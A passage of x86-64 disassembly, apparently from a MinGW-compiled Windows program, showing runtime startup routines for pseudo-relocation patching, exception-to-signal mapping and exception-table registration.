  401f1e:	83 c0 08             	add    $0x8,%eax
  401f21:	48 8b 4c 15 00       	mov    0x0(%rbp,%rdx,1),%rcx
  401f26:	39 f8                	cmp    %edi,%eax
  401f28:	48 89 0c 13          	mov    %rcx,(%rbx,%rdx,1)
  401f2c:	72 ee                	jb     0x401f1c
  401f2e:	eb c8                	jmp    0x401ef8
  401f30:	48 03 35 f1 66 00 00 	add    0x66f1(%rip),%rsi        # 0x408628
  401f37:	41 b8 40 00 00 00    	mov    $0x40,%r8d
  401f3d:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  401f42:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  401f47:	49 89 f1             	mov    %rsi,%r9
  401f4a:	48 89 4e 08          	mov    %rcx,0x8(%rsi)
  401f4e:	48 89 56 10          	mov    %rdx,0x10(%rsi)
  401f52:	ff 15 04 74 00 00    	call   *0x7404(%rip)        # 0x40935c
  401f58:	85 c0                	test   %eax,%eax
  401f5a:	0f 85 6e ff ff ff    	jne    0x401ece
  401f60:	ff 15 76 73 00 00    	call   *0x7376(%rip)        # 0x4092dc
  401f66:	48 8d 0d 0b 33 00 00 	lea    0x330b(%rip),%rcx        # 0x405278
  401f6d:	89 c2                	mov    %eax,%edx
  401f6f:	e8 9c 12 00 00       	call   0x403210
  401f74:	8b 45 00             	mov    0x0(%rbp),%eax
  401f77:	89 ff                	mov    %edi,%edi
  401f79:	89 03                	mov    %eax,(%rbx)
  401f7b:	8b 44 3d fc          	mov    -0x4(%rbp,%rdi,1),%eax
  401f7f:	89 44 3b fc          	mov    %eax,-0x4(%rbx,%rdi,1)
  401f83:	e9 70 ff ff ff       	jmp    0x401ef8
  401f88:	31 f6                	xor    %esi,%esi
  401f8a:	e9 c8 fe ff ff       	jmp    0x401e57
  401f8f:	89 ff                	mov    %edi,%edi
  401f91:	0f b7 44 3d fe       	movzwl -0x2(%rbp,%rdi,1),%eax
  401f96:	66 89 44 3b fe       	mov    %ax,-0x2(%rbx,%rdi,1)
  401f9b:	e9 58 ff ff ff       	jmp    0x401ef8
  401fa0:	48 8b 05 81 66 00 00 	mov    0x6681(%rip),%rax        # 0x408628
  401fa7:	48 8d 0d 92 32 00 00 	lea    0x3292(%rip),%rcx        # 0x405240
  401fae:	41 8b 54 24 08       	mov    0x8(%r12),%edx
  401fb3:	4c 8b 44 30 18       	mov    0x18(%rax,%rsi,1),%r8
  401fb8:	e8 53 12 00 00       	call   0x403210
  401fbd:	48 8d 0d 5c 32 00 00 	lea    0x325c(%rip),%rcx        # 0x405220
  401fc4:	48 89 da             	mov    %rbx,%rdx
  401fc7:	e8 44 12 00 00       	call   0x403210
  401fcc:	90                   	nop
  401fcd:	0f 1f 00             	nopl   (%rax)
  401fd0:	55                   	push   %rbp
  401fd1:	41 57                	push   %r15
  401fd3:	41 56                	push   %r14
  401fd5:	41 55                	push   %r13
  401fd7:	41 54                	push   %r12
  401fd9:	57                   	push   %rdi
  401fda:	56                   	push   %rsi
  401fdb:	53                   	push   %rbx
  401fdc:	48 83 ec 38          	sub    $0x38,%rsp
  401fe0:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
  401fe7:	00 
  401fe8:	8b 1d 32 66 00 00    	mov    0x6632(%rip),%ebx        # 0x408620
  401fee:	85 db                	test   %ebx,%ebx
  401ff0:	74 11                	je     0x402003
  401ff2:	48 8d 65 b8          	lea    -0x48(%rbp),%rsp
  401ff6:	5b                   	pop    %rbx
  401ff7:	5e                   	pop    %rsi
  401ff8:	5f                   	pop    %rdi
  401ff9:	41 5c                	pop    %r12
  401ffb:	41 5d                	pop    %r13
  401ffd:	41 5e                	pop    %r14
  401fff:	41 5f                	pop    %r15
  402001:	5d                   	pop    %rbp
  402002:	c3                   	ret
  402003:	c7 05 13 66 00 00 01 	movl   $0x1,0x6613(%rip)        # 0x408620
  40200a:	00 00 00 
  40200d:	e8 0e 0b 00 00       	call   0x402b20
  402012:	48 98                	cltq
  402014:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  402018:	48 8d 04 c5 1e 00 00 	lea    0x1e(,%rax,8),%rax
  40201f:	00 
  402020:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  402024:	e8 37 0d 00 00       	call   0x402d60
  402029:	4c 8b 25 20 33 00 00 	mov    0x3320(%rip),%r12        # 0x405350
  402030:	c7 05 ea 65 00 00 00 	movl   $0x0,0x65ea(%rip)        # 0x408624
  402037:	00 00 00 
  40203a:	48 8b 35 1f 33 00 00 	mov    0x331f(%rip),%rsi        # 0x405360
  402041:	48 29 c4             	sub    %rax,%rsp
  402044:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
  402049:	48 89 05 d8 65 00 00 	mov    %rax,0x65d8(%rip)        # 0x408628
  402050:	4c 89 e0             	mov    %r12,%rax
  402053:	48 29 f0             	sub    %rsi,%rax
  402056:	48 83 f8 07          	cmp    $0x7,%rax
  40205a:	7e 96                	jle    0x401ff2
  40205c:	48 83 f8 0b          	cmp    $0xb,%rax
  402060:	8b 16                	mov    (%rsi),%edx
  402062:	0f 8e c8 00 00 00    	jle    0x402130
  402068:	85 d2                	test   %edx,%edx
  40206a:	0f 84 a4 00 00 00    	je     0x402114
  402070:	4c 39 e6             	cmp    %r12,%rsi
  402073:	0f 83 79 ff ff ff    	jae    0x401ff2
  402079:	4c 8d 76 08          	lea    0x8(%rsi),%r14
  40207d:	49 83 c4 07          	add    $0x7,%r12
  402081:	4c 8b 2d f8 32 00 00 	mov    0x32f8(%rip),%r13        # 0x405380
  402088:	48 8d 7d a8          	lea    -0x58(%rbp),%rdi
  40208c:	4d 29 f4             	sub    %r14,%r12
  40208f:	49 c1 ec 03          	shr    $0x3,%r12
  402093:	4e 8d 64 e6 08       	lea    0x8(%rsi,%r12,8),%r12
  402098:	eb 0a                	jmp    0x4020a4
  40209a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4020a0:	49 83 c6 08          	add    $0x8,%r14
  4020a4:	8b 4e 04             	mov    0x4(%rsi),%ecx
  4020a7:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  4020ad:	48 89 fa             	mov    %rdi,%rdx
  4020b0:	8b 06                	mov    (%rsi),%eax
  4020b2:	4c 89 f6             	mov    %r14,%rsi
  4020b5:	4c 01 e9             	add    %r13,%rcx
  4020b8:	03 01                	add    (%rcx),%eax
  4020ba:	89 45 a8             	mov    %eax,-0x58(%rbp)
  4020bd:	e8 3e fd ff ff       	call   0x401e00
  4020c2:	4d 39 e6             	cmp    %r12,%r14
  4020c5:	75 d9                	jne    0x4020a0
  4020c7:	8b 05 57 65 00 00    	mov    0x6557(%rip),%eax        # 0x408624
  4020cd:	31 f6                	xor    %esi,%esi
  4020cf:	4c 8b 25 86 72 00 00 	mov    0x7286(%rip),%r12        # 0x40935c
  4020d6:	85 c0                	test   %eax,%eax
  4020d8:	0f 8e 14 ff ff ff    	jle    0x401ff2
  4020de:	66 90                	xchg   %ax,%ax
  4020e0:	48 8b 05 41 65 00 00 	mov    0x6541(%rip),%rax        # 0x408628
  4020e7:	48 01 f0             	add    %rsi,%rax
  4020ea:	44 8b 00             	mov    (%rax),%r8d
  4020ed:	45 85 c0             	test   %r8d,%r8d
  4020f0:	74 0e                	je     0x402100
  4020f2:	48 8b 50 10          	mov    0x10(%rax),%rdx
  4020f6:	49 89 f9             	mov    %rdi,%r9
  4020f9:	48 8b 48 08          	mov    0x8(%rax),%rcx
  4020fd:	41 ff d4             	call   *%r12
  402100:	83 c3 01             	add    $0x1,%ebx
  402103:	48 83 c6 28          	add    $0x28,%rsi
  402107:	3b 1d 17 65 00 00    	cmp    0x6517(%rip),%ebx        # 0x408624
  40210d:	7c d1                	jl     0x4020e0
  40210f:	e9 de fe ff ff       	jmp    0x401ff2
  402114:	8b 4e 04             	mov    0x4(%rsi),%ecx
  402117:	85 c9                	test   %ecx,%ecx
  402119:	0f 85 51 ff ff ff    	jne    0x402070
  40211f:	8b 56 08             	mov    0x8(%rsi),%edx
  402122:	85 d2                	test   %edx,%edx
  402124:	75 1d                	jne    0x402143
  402126:	8b 56 0c             	mov    0xc(%rsi),%edx
  402129:	48 83 c6 0c          	add    $0xc,%rsi
  40212d:	0f 1f 00             	nopl   (%rax)
  402130:	85 d2                	test   %edx,%edx
  402132:	0f 85 38 ff ff ff    	jne    0x402070
  402138:	8b 46 04             	mov    0x4(%rsi),%eax
  40213b:	85 c0                	test   %eax,%eax
  40213d:	0f 85 2d ff ff ff    	jne    0x402070
  402143:	8b 56 08             	mov    0x8(%rsi),%edx
  402146:	83 fa 01             	cmp    $0x1,%edx
  402149:	0f 85 2f 01 00 00    	jne    0x40227e
  40214f:	4c 8b 2d 2a 32 00 00 	mov    0x322a(%rip),%r13        # 0x405380
  402156:	48 83 c6 0c          	add    $0xc,%rsi
  40215a:	49 bf 00 00 00 00 ff 	movabs $0xffffffff00000000,%r15
  402161:	ff ff ff 
  402164:	4c 8d 75 a8          	lea    -0x58(%rbp),%r14
  402168:	4c 39 e6             	cmp    %r12,%rsi
  40216b:	72 48                	jb     0x4021b5
  40216d:	e9 80 fe ff ff       	jmp    0x401ff2
  402172:	0f 86 b8 00 00 00    	jbe    0x402230
  402178:	83 fa 20             	cmp    $0x20,%edx
  40217b:	0f 84 7f 00 00 00    	je     0x402200
  402181:	83 fa 40             	cmp    $0x40,%edx
  402184:	0f 85 e0 00 00 00    	jne    0x40226a
  40218a:	48 8b 11             	mov    (%rcx),%rdx
  40218d:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  402193:	4c 89 f7             	mov    %r14,%rdi
  402196:	48 29 c2             	sub    %rax,%rdx
  402199:	4c 01 ca             	add    %r9,%rdx
  40219c:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
  4021a0:	4c 89 f2             	mov    %r14,%rdx
  4021a3:	e8 58 fc ff ff       	call   0x401e00
  4021a8:	48 83 c6 0c          	add    $0xc,%rsi
  4021ac:	4c 39 e6             	cmp    %r12,%rsi
  4021af:	0f 83 12 ff ff ff    	jae    0x4020c7
  4021b5:	8b 4e 04             	mov    0x4(%rsi),%ecx
  4021b8:	8b 06                	mov    (%rsi),%eax
  4021ba:	0f b6 56 08          	movzbl 0x8(%rsi),%edx
  4021be:	4c 01 e9             	add    %r13,%rcx
  4021c1:	4c 01 e8             	add    %r13,%rax
  4021c4:	83 fa 10             	cmp    $0x10,%edx
  4021c7:	4c 8b 08             	mov    (%rax),%r9
  4021ca:	75 a6                	jne    0x402172
  4021cc:	44 0f b7 01          	movzwl (%rcx),%r8d
  4021d0:	4c 89 f2             	mov    %r14,%rdx
  4021d3:	4c 89 f7             	mov    %r14,%rdi
  4021d6:	4d 89 c2             	mov    %r8,%r10
  4021d9:	49 81 ca 00 00 ff ff 	or     $0xffffffffffff0000,%r10
  4021e0:	66 45 85 c0          	test   %r8w,%r8w
  4021e4:	4d 0f 48 c2          	cmovs  %r10,%r8
  4021e8:	49 29 c0             	sub    %rax,%r8
  4021eb:	4d 01 c8             	add    %r9,%r8
  4021ee:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
  4021f2:	41 b8 02 00 00 00    	mov    $0x2,%r8d
  4021f8:	e8 03 fc ff ff       	call   0x401e00
  4021fd:	eb a9                	jmp    0x4021a8
  4021ff:	90                   	nop
  402200:	8b 11                	mov    (%rcx),%edx
  402202:	4c 89 f7             	mov    %r14,%rdi
  402205:	49 89 d0             	mov    %rdx,%r8
  402208:	4c 09 fa             	or     %r15,%rdx
  40220b:	45 85 c0             	test   %r8d,%r8d
  40220e:	49 0f 49 d0          	cmovns %r8,%rdx
  402212:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  402218:	48 29 c2             	sub    %rax,%rdx
  40221b:	4c 01 ca             	add    %r9,%rdx
  40221e:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
  402222:	4c 89 f2             	mov    %r14,%rdx
  402225:	e8 d6 fb ff ff       	call   0x401e00
  40222a:	e9 79 ff ff ff       	jmp    0x4021a8
  40222f:	90                   	nop
  402230:	83 fa 08             	cmp    $0x8,%edx
  402233:	75 35                	jne    0x40226a
  402235:	44 0f b6 01          	movzbl (%rcx),%r8d
  402239:	4c 89 f2             	mov    %r14,%rdx
  40223c:	4c 89 f7             	mov    %r14,%rdi
  40223f:	4d 89 c2             	mov    %r8,%r10
  402242:	49 81 ca 00 ff ff ff 	or     $0xffffffffffffff00,%r10
  402249:	45 84 c0             	test   %r8b,%r8b
  40224c:	4d 0f 48 c2          	cmovs  %r10,%r8
  402250:	49 29 c0             	sub    %rax,%r8
  402253:	4d 01 c8             	add    %r9,%r8
  402256:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
  40225a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  402260:	e8 9b fb ff ff       	call   0x401e00
  402265:	e9 3e ff ff ff       	jmp    0x4021a8
  40226a:	48 8d 0d 67 30 00 00 	lea    0x3067(%rip),%rcx        # 0x4052d8
  402271:	48 c7 45 a8 00 00 00 	movq   $0x0,-0x58(%rbp)
  402278:	00 
  402279:	e8 92 0f 00 00       	call   0x403210
  40227e:	48 8d 0d 1b 30 00 00 	lea    0x301b(%rip),%rcx        # 0x4052a0
  402285:	e8 86 0f 00 00       	call   0x403210
  40228a:	90                   	nop
  40228b:	90                   	nop
  40228c:	90                   	nop
  40228d:	90                   	nop
  40228e:	90                   	nop
  40228f:	90                   	nop
  402290:	48 83 ec 28          	sub    $0x28,%rsp
  402294:	8b 01                	mov    (%rcx),%eax
  402296:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  40229b:	77 63                	ja     0x402300
  40229d:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  4022a2:	73 7b                	jae    0x40231f
  4022a4:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  4022a9:	0f 84 05 01 00 00    	je     0x4023b4
  4022af:	0f 87 cb 00 00 00    	ja     0x402380
  4022b5:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  4022ba:	0f 84 f4 00 00 00    	je     0x4023b4
  4022c0:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  4022c5:	0f 85 c3 00 00 00    	jne    0x40238e
  4022cb:	31 d2                	xor    %edx,%edx
  4022cd:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4022d2:	e8 19 0b 00 00       	call   0x402df0
  4022d7:	48 83 f8 01          	cmp    $0x1,%rax
  4022db:	0f 84 2f 01 00 00    	je     0x402410
  4022e1:	48 85 c0             	test   %rax,%rax
  4022e4:	0f 84 3c 01 00 00    	je     0x402426
  4022ea:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4022ef:	ff d0                	call   *%rax
  4022f1:	31 c0                	xor    %eax,%eax
  4022f3:	48 83 c4 28          	add    $0x28,%rsp
  4022f7:	c3                   	ret
  4022f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4022ff:	00 
  402300:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  402305:	0f 84 b5 00 00 00    	je     0x4023c0
  40230b:	77 37                	ja     0x402344
  40230d:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  402312:	0f 84 9c 00 00 00    	je     0x4023b4
  402318:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  40231d:	75 6f                	jne    0x40238e
  40231f:	31 d2                	xor    %edx,%edx
  402321:	b9 08 00 00 00       	mov    $0x8,%ecx
  402326:	e8 c5 0a 00 00       	call   0x402df0
  40232b:	48 83 f8 01          	cmp    $0x1,%rax
  40232f:	74 6f                	je     0x4023a0
  402331:	48 85 c0             	test   %rax,%rax
  402334:	74 58                	je     0x40238e
  402336:	b9 08 00 00 00       	mov    $0x8,%ecx
  40233b:	ff d0                	call   *%rax
  40233d:	31 c0                	xor    %eax,%eax
  40233f:	48 83 c4 28          	add    $0x28,%rsp
  402343:	c3                   	ret
  402344:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
  402349:	74 69                	je     0x4023b4
  40234b:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  402350:	75 3c                	jne    0x40238e
  402352:	31 d2                	xor    %edx,%edx
  402354:	b9 04 00 00 00       	mov    $0x4,%ecx
  402359:	e8 92 0a 00 00       	call   0x402df0
  40235e:	48 83 f8 01          	cmp    $0x1,%rax
  402362:	0f 84 88 00 00 00    	je     0x4023f0
  402368:	48 85 c0             	test   %rax,%rax
  40236b:	0f 84 b5 00 00 00    	je     0x402426
  402371:	b9 04 00 00 00       	mov    $0x4,%ecx
  402376:	ff d0                	call   *%rax
  402378:	31 c0                	xor    %eax,%eax
  40237a:	48 83 c4 28          	add    $0x28,%rsp
  40237e:	c3                   	ret
  40237f:	90                   	nop
  402380:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  402385:	74 cb                	je     0x402352
  402387:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
  40238c:	74 26                	je     0x4023b4
  40238e:	b8 01 00 00 00       	mov    $0x1,%eax
  402393:	48 83 c4 28          	add    $0x28,%rsp
  402397:	c3                   	ret
  402398:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40239f:	00 
  4023a0:	ba 01 00 00 00       	mov    $0x1,%edx
  4023a5:	b9 08 00 00 00       	mov    $0x8,%ecx
  4023aa:	e8 41 0a 00 00       	call   0x402df0
  4023af:	e8 1c fa ff ff       	call   0x401dd0
  4023b4:	31 c0                	xor    %eax,%eax
  4023b6:	48 83 c4 28          	add    $0x28,%rsp
  4023ba:	c3                   	ret
  4023bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4023c0:	31 d2                	xor    %edx,%edx
  4023c2:	b9 08 00 00 00       	mov    $0x8,%ecx
  4023c7:	e8 24 0a 00 00       	call   0x402df0
  4023cc:	48 83 f8 01          	cmp    $0x1,%rax
  4023d0:	0f 85 5b ff ff ff    	jne    0x402331
  4023d6:	ba 01 00 00 00       	mov    $0x1,%edx
  4023db:	b9 08 00 00 00       	mov    $0x8,%ecx
  4023e0:	e8 0b 0a 00 00       	call   0x402df0
  4023e5:	31 c0                	xor    %eax,%eax
  4023e7:	e9 07 ff ff ff       	jmp    0x4022f3
  4023ec:	0f 1f 40 00          	nopl   0x0(%rax)
  4023f0:	ba 01 00 00 00       	mov    $0x1,%edx
  4023f5:	b9 04 00 00 00       	mov    $0x4,%ecx
  4023fa:	e8 f1 09 00 00       	call   0x402df0
  4023ff:	31 c0                	xor    %eax,%eax
  402401:	e9 ed fe ff ff       	jmp    0x4022f3
  402406:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40240d:	00 00 00 
  402410:	ba 01 00 00 00       	mov    $0x1,%edx
  402415:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40241a:	e8 d1 09 00 00       	call   0x402df0
  40241f:	31 c0                	xor    %eax,%eax
  402421:	e9 cd fe ff ff       	jmp    0x4022f3
  402426:	b8 04 00 00 00       	mov    $0x4,%eax
  40242b:	e9 c3 fe ff ff       	jmp    0x4022f3
  402430:	41 54                	push   %r12
  402432:	55                   	push   %rbp
  402433:	57                   	push   %rdi
  402434:	56                   	push   %rsi
  402435:	53                   	push   %rbx
  402436:	48 83 ec 20          	sub    $0x20,%rsp
  40243a:	e8 91 07 00 00       	call   0x402bd0
  40243f:	48 89 c5             	mov    %rax,%rbp
  402442:	8b 05 00 62 00 00    	mov    0x6200(%rip),%eax        # 0x408648
  402448:	85 c0                	test   %eax,%eax
  40244a:	75 25                	jne    0x402471
  40244c:	48 85 ed             	test   %rbp,%rbp
  40244f:	74 20                	je     0x402471
  402451:	48 8d 0d b8 2e 00 00 	lea    0x2eb8(%rip),%rcx        # 0x405310
  402458:	c7 05 e6 61 00 00 01 	movl   $0x1,0x61e6(%rip)        # 0x408648
  40245f:	00 00 00 
  402462:	e8 a9 05 00 00       	call   0x402a10
  402467:	48 85 c0             	test   %rax,%rax
  40246a:	74 14                	je     0x402480
  40246c:	b8 01 00 00 00       	mov    $0x1,%eax
  402471:	48 83 c4 20          	add    $0x20,%rsp
  402475:	5b                   	pop    %rbx
  402476:	5e                   	pop    %rsi
  402477:	5f                   	pop    %rdi
  402478:	5d                   	pop    %rbp
  402479:	41 5c                	pop    %r12
  40247b:	c3                   	ret
  40247c:	0f 1f 40 00          	nopl   0x0(%rax)
  402480:	48 8d 1d d9 62 00 00 	lea    0x62d9(%rip),%rbx        # 0x408760
  402487:	b9 30 00 00 00       	mov    $0x30,%ecx
  40248c:	31 f6                	xor    %esi,%esi
  40248e:	48 8d 15 cb 61 00 00 	lea    0x61cb(%rip),%rdx        # 0x408660
  402495:	48 89 df             	mov    %rbx,%rdi
  402498:	f3 48 ab             	rep stos %rax,(%rdi)
  40249b:	4c 8d 25 ee fd ff ff 	lea    -0x212(%rip),%r12        # 0x402290
  4024a2:	b9 20 00 00 00       	mov    $0x20,%ecx
  4024a7:	48 89 d7             	mov    %rdx,%rdi
  4024aa:	f3 48 ab             	rep stos %rax,(%rdi)
  4024ad:	49 29 ec             	sub    %rbp,%r12
  4024b0:	48 89 d7             	mov    %rdx,%rdi
  4024b3:	eb 2e                	jmp    0x4024e3
  4024b5:	c6 07 09             	movb   $0x9,(%rdi)
  4024b8:	48 83 c6 01          	add    $0x1,%rsi
  4024bc:	48 83 c3 0c          	add    $0xc,%rbx
  4024c0:	44 89 67 04          	mov    %r12d,0x4(%rdi)
  4024c4:	8b 48 0c             	mov    0xc(%rax),%ecx
  4024c7:	89 4b f4             	mov    %ecx,-0xc(%rbx)
  4024ca:	03 48 08             	add    0x8(%rax),%ecx
  4024cd:	48 89 f8             	mov    %rdi,%rax
  4024d0:	48 83 c7 08          	add    $0x8,%rdi
  4024d4:	48 29 e8             	sub    %rbp,%rax
  4024d7:	89 43 fc             	mov    %eax,-0x4(%rbx)
  4024da:	89 4b f8             	mov    %ecx,-0x8(%rbx)
  4024dd:	48 83 fe 20          	cmp    $0x20,%rsi
  4024e1:	74 32                	je     0x402515
  4024e3:	48 89 f1             	mov    %rsi,%rcx
  4024e6:	e8 75 06 00 00       	call   0x402b60
  4024eb:	48 85 c0             	test   %rax,%rax
  4024ee:	75 c5                	jne    0x4024b5
  4024f0:	48 85 f6             	test   %rsi,%rsi
  4024f3:	89 f2                	mov    %esi,%edx
  4024f5:	0f 84 71 ff ff ff    	je     0x40246c
  4024fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402500:	48 8d 0d 59 62 00 00 	lea    0x6259(%rip),%rcx        # 0x408760
  402507:	49 89 e8             	mov    %rbp,%r8
  40250a:	ff 15 04 6e 00 00    	call   *0x6e04(%rip)        # 0x409314
  402510:	e9 57 ff ff ff       	jmp    0x40246c
  402515:	ba 20 00 00 00       	mov    $0x20,%edx
  40251a:	eb e4                	jmp    0x402500
  40251c:	0f 1f 40 00          	nopl   0x0(%rax)
  402520:	53                   	push   %rbx
  402521:	48 83 ec 20          	sub    $0x20,%rsp
  402525:	48 8b 11             	mov    (%rcx),%rdx
  402528:	8b 02                	mov    (%rdx),%eax
  40252a:	48 89 cb             	mov    %rcx,%rbx
  40252d:	89 c1                	mov    %eax,%ecx
  40252f:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
  402535:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
  40253b:	0f 84 bf 00 00 00    	je     0x402600
  402541:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  402546:	77 68                	ja     0x4025b0
  402548:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  40254d:	73 7c                	jae    0x4025cb
  40254f:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  402554:	0f 84 b0 00 00 00    	je     0x40260a
  40255a:	0f 87 f4 00 00 00    	ja     0x402654
  402560:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  402565:	0f 84 9f 00 00 00    	je     0x40260a
  40256b:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  402570:	75 1f                	jne    0x402591
  402572:	31 d2                	xor    %edx,%edx
  402574:	b9 0b 00 00 00       	mov    $0xb,%ecx
  402579:	e8 72 08 00 00       	call   0x402df0
  40257e:	48 83 f8 01          	cmp    $0x1,%rax
  402582:	0f 84 51 01 00 00    	je     0x4026d9
  402588:	48 85 c0             	test   %rax,%rax
  40258b:	0f 85 0f 01 00 00    	jne    0x4026a0
  402591:	48 8b 05 a8 60 00 00 	mov    0x60a8(%rip),%rax        # 0x408640
  402598:	48 85 c0             	test   %rax,%rax
  40259b:	0f 84 10 01 00 00    	je     0x4026b1
  4025a1:	48 89 d9             	mov    %rbx,%rcx
  4025a4:	48 83 c4 20          	add    $0x20,%rsp
  4025a8:	5b                   	pop    %rbx
  4025a9:	48 ff e0             	rex.W jmp *%rax
  4025ac:	0f 1f 40 00          	nopl   0x0(%rax)
  4025b0:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  4025b5:	0f 84 b5 00 00 00    	je     0x402670
  4025bb:	77 58                	ja     0x402615
  4025bd:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  4025c2:	74 46                	je     0x40260a
  4025c4:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  4025c9:	75 c6                	jne    0x402591
  4025cb:	31 d2                	xor    %edx,%edx
  4025cd:	b9 08 00 00 00       	mov    $0x8,%ecx
  4025d2:	e8 19 08 00 00       	call   0x402df0
  4025d7:	48 83 f8 01          	cmp    $0x1,%rax
  4025db:	0f 84 df 00 00 00    	je     0x4026c0
  4025e1:	48 85 c0             	test   %rax,%rax
  4025e4:	74 ab                	je     0x402591
  4025e6:	b9 08 00 00 00       	mov    $0x8,%ecx
  4025eb:	ff d0                	call   *%rax
  4025ed:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4025f2:	48 83 c4 20          	add    $0x20,%rsp
  4025f6:	5b                   	pop    %rbx
  4025f7:	c3                   	ret
  4025f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4025ff:	00 
  402600:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
  402604:	0f 85 37 ff ff ff    	jne    0x402541
  40260a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40260f:	48 83 c4 20          	add    $0x20,%rsp
  402613:	5b                   	pop    %rbx
  402614:	c3                   	ret
  402615:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
  40261a:	74 ee                	je     0x40260a
  40261c:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  402621:	0f 85 6a ff ff ff    	jne    0x402591
  402627:	31 d2                	xor    %edx,%edx
  402629:	b9 04 00 00 00       	mov    $0x4,%ecx
  40262e:	e8 bd 07 00 00       	call   0x402df0
  402633:	48 83 f8 01          	cmp    $0x1,%rax
  402637:	0f 84 b3 00 00 00    	je     0x4026f0
  40263d:	48 85 c0             	test   %rax,%rax
  402640:	0f 84 4b ff ff ff    	je     0x402591
  402646:	b9 04 00 00 00       	mov    $0x4,%ecx
  40264b:	ff d0                	call   *%rax
  40264d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402652:	eb 9e                	jmp    0x4025f2
  402654:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  402659:	74 cc                	je     0x402627
  40265b:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
  402660:	0f 85 2b ff ff ff    	jne    0x402591
  402666:	eb a2                	jmp    0x40260a
  402668:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40266f:	00 
  402670:	31 d2                	xor    %edx,%edx
  402672:	b9 08 00 00 00       	mov    $0x8,%ecx
  402677:	e8 74 07 00 00       	call   0x402df0
  40267c:	48 83 f8 01          	cmp    $0x1,%rax
  402680:	0f 85 5b ff ff ff    	jne    0x4025e1
  402686:	ba 01 00 00 00       	mov    $0x1,%edx
  40268b:	b9 08 00 00 00       	mov    $0x8,%ecx
  402690:	e8 5b 07 00 00       	call   0x402df0
  402695:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40269a:	e9 53 ff ff ff       	jmp    0x4025f2
  40269f:	90                   	nop
  4026a0:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4026a5:	ff d0                	call   *%rax
  4026a7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4026ac:	e9 41 ff ff ff       	jmp    0x4025f2
  4026b1:	31 c0                	xor    %eax,%eax
  4026b3:	e9 3a ff ff ff       	jmp    0x4025f2
  4026b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4026bf:	00 
  4026c0:	ba 01 00 00 00       	mov    $0x1,%edx
  4026c5:	b9 08 00 00 00       	mov    $0x8,%ecx
  4026ca:	e8 21 07 00 00       	call   0x402df0
  4026cf:	e8 fc f6 ff ff       	call   0x401dd0
  4026d4:	e9 31 ff ff ff       	jmp    0x40260a
  4026d9:	ba 01 00 00 00       	mov    $0x1,%edx
  4026de:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4026e3:	e8 08 07 00 00       	call   0x402df0
  4026e8:	83 c8 ff             	or     $0xffffffff,%eax
  4026eb:	e9 02 ff ff ff       	jmp    0x4025f2
  4026f0:	ba 01 00 00 00       	mov    $0x1,%edx
  4026f5:	b9 04 00 00 00       	mov    $0x4,%ecx
  4026fa:	e8 f1 06 00 00       	call   0x402df0
  4026ff:	83 c8 ff             	or     $0xffffffff,%eax
  402702:	e9 eb fe ff ff       	jmp    0x4025f2
  402707:	90                   	nop
  402708:	90                   	nop
  402709:	90                   	nop
  40270a:	90                   	nop
  40270b:	90                   	nop
  40270c:	90                   	nop
  40270d:	90                   	nop
  40270e:	90                   	nop
  40270f:	90                   	nop
  402710:	55                   	push   %rbp
  402711:	57                   	push   %rdi
